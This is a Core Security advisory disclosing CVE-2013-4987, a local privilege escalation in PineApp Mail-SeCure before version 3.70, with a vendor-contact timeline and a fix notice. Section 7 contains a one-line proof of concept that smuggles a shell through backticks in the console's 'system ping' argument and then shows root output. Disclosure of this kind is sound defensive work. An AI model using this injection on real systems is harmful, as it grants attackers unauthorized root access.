@@ -1,0 +1,158 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com/
+
+PinApp Mail-SeCure Access Control Failure
+
+
+1. *Advisory Information*
+
+Title: PinApp Mail-SeCure Access Control Failure
+Advisory ID: CORE-2013-0904
+Advisory URL:
+http://www.coresecurity.com/advisories/pinapp-mail-secure-access-control-failure
+Date published: 2013-10-02
+Date of last update: 2013-10-02
+Vendors contacted: PineApp Team
+Release mode: Coordinated release
+
+
+2. *Vulnerability Information*
+
+Class: Access control failure [CWE-264]
+Impact: Security bypass
+Remotely Exploitable: No
+Locally Exploitable: Yes
+CVE Name: CVE-2013-4987
+
+
+3. *Vulnerability Description*
+
+A security vulnerability was discovered in PineApp [1] Mail-SeCure Suite
+[2], allowing a non-privileged attacker to get a root shell by sending a
+specially crafted command from the Mail-SeCure console. A valid user
+account is needed to launch the attack, so this is a privileged
+escalation vulnerability that can be exploited locally only.
+
+
+4. *Vulnerable Packages*
+
+   . All Mail-SeCure versions prior to 3.70.
+
+
+5. *Non-Vulnerable Packages*
+
+   . Mail-SeCure 3.70 (revision Sep. 2013).
+
+
+6. *Credits*
+
+This vulnerability was discovered and researched by John Petrusa from
+Core Security.
+This report was coordinated by Fernando Miranda from Core Advisories Team.
+
+
+7. *Technical Description / Proof of Concept Code*
+
+Open a Mail-SeCure console as 'pinapp' user and execute the following
+command:
+
+/-----
+pa_cli> system ping `/bin/sh>/dev/tty`
+-----/
+
+As a result, you should be the super-user:
+
+/-----
+sh-3.00# id
+uid=0(root) gid=0(root) groups=0(root)
+-----/
+
+
+8. *Report Timeline*
+
+. 2013-09-03:
+Core Security Technologies attempts to contact vendor using the PinApp
+official contact page [3]. No reply received. Publication date is set
+for Sep 25th, 2013.
+
+. 2013-09-09:
+Core attempts to contact vendor.
+
+. 2013-09-10:
+Vendor acknowledges Core's e-mail, and asks for a technical description
+of the vulnerability.
+
+. 2013-09-10:
+Technical details sent to the vendor.
+
+. 2013-09-16:
+Core asks for a status update.
+
+. 2013-09-17:
+Vendor notifies that they have a fix that will be included in the next
+revision update.
+
+. 2013-09-19:
+Vendor notifies that they will probably release the patch next week.
+
+. 2013-09-30:
+Core asks if there is a patch available.
+
+. 2013-10-01:
+Vendor notifies that they have released a global update to all
+Mail-SeCure units worldwide to block the below vulnerability.
+
+. 2013-10-02:
+Advisory CORE-2013-0904 published.
+
+
+9. *References*
+
+[1] http://www.pineapp.com.
+[2] http://www2.pineapp.com/products/1/email-security.
+[3] PinApp official contact page http://www2.pineapp.com/contact.
+
+
+10. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+
+11. *About Core Security Technologies*
+
+Core Security Technologies enables organizations to get ahead of threats
+with security test and measurement solutions that continuously identify
+and demonstrate real-world exposures to their most critical assets. Our
+customers can gain real visibility into their security standing, real
+validation of their security controls, and real metrics to more
+effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted
+research and leading-edge threat expertise from the company's Security
+Consulting Services, CoreLabs and Engineering groups. Core Security
+Technologies can be reached at +1 (617) 399-6980 or on the Web at:
+http://www.coresecurity.com.
+
+
+12. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2013 Core Security
+Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
+Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
+License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+
+13. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
